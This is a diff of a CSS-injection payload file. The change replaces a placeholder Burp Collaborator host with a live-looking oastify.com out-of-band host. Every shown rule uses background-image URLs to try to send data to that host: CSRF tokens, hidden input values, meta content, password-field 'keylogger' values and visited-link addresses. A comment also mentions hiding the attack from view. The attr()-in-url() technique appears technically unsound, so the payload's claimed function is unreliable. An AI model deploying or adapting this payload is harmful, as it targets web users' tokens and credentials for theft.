@@ -5,27 +5,27 @@
 input[name='csrf_token'], 
 input[name='csrf'], 
 input[name='authenticity_token'] {
-  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=csrf&value=attr(value)");
+  background-image: url("https://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/exfil?type=csrf&value=attr(value)");
 }
 
 /* Exfiltrate hidden inputs */
 input[type='hidden'] {
-  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=hidden&name=attr(name)&value=attr(value)");
+  background-image: url("https://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/exfil?type=hidden&name=attr(name)&value=attr(value)");
 }
 
 /* Exfiltrate meta tags */
 head meta[name='description'] {
-  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=meta&content=attr(content)");
+  background-image: url("https://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/exfil?type=meta&content=attr(content)");
 }
 
 /* Keylogger via :active pseudo-class */
 input[type='password']:active {
-  background-image: url("https://your-collab-id.burpcollaborator.net/keylogger?key=attr(value)");
+  background-image: url("https://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/keylogger?key=attr(value)");
 }
 
 /* Detect visited links */
 a:visited {
-  background-image: url("https://your-collab-id.burpcollaborator.net/visited?url=attr(href)");
+  background-image: url("https://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/visited?url=attr(href)");
 }
 
 /* Hide the attack from view */
